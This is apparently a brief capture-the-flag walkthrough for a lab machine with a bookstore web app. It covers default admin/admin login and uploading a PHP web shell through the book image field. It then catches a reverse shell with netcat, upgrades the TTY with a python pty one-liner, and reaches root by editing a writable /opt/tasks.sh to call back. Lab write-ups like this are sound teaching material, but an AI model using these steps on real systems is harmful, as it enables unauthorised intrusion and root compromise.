ip: 10.0.0.26

## First flag

```txt
http://10.0.0.26/database/user.txt
```

## Second flag

- make login at [admin page](http://10.0.0.26/admin.php)

  - user: admin
  - pass: admin

- add new book at [this page](http://10.0.0.26/admin_add.php)
  - isbn: shell
  - title: shell title
  - author: shell author
  - image: put `./shell.php` using current vpn ip
  - description: empty
  - price: 0
  - publisher: attacker

- listen for connection using nc
```bash
nc -nlvp 8080
```
- open [attack endpoint](http://10.0.0.26/book.php?bookisbn=shell)

- `export TERM=xterm`
- `python -c 'import pty;pty.spawn("/bin/bash");`
- vim /root/root.txt
  - ESC
  - ENTER
  - ESC
  - ENTER

boooom! you get all flags

you can get root access by editing `/opt/tasks.sh` to your ip and port using vim.basic
listen for connection using `nc` on your machine and boom, you are root
